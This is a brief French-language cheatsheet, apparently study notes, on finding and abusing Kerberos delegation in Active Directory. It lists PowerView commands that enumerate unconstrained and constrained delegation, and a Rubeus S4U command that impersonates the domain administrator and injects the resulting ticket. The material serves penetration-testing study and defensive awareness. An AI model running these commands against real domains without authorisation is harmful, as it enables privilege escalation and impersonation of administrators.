# Cheatsheet - Delegation attacks

> [!summary] Objectif
> Détecter et abuser les délégations Kerberos. Ne jamais mélanger les 4 cas : unconstrained / constrained user / constrained computer / RBCD.

### Find unconstrained delegation
```powershell
. C:\AD\Tools\PowerView.ps1
Get-DomainComputer -Unconstrained | Select-Object -ExpandProperty Name
```

### Find constrained delegation
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

### Abuse constrained (S4U)
```powershell
Rubeus.exe s4u /user:<svc> /rc4:<hash> /impersonateuser:administrator /msdsspn:<spn> /altservice:<svc> /ptt
```

> [!note] Deux commandes à retenir d'abord : `Get-DomainComputer -Unconstrained` et `Get-DomainUser -TrustedToAuth`. Coercition (Printer Bug / MS-WSP / MS-DFSNM) et abus unconstrained → [[1. Cheatsheet - Toutes les commandes]].

## Related
[[Cheatsheet - RBCD]] · [[Cheatsheet - Trusts et forêts]] · [[Synthèse - Kerberos]]
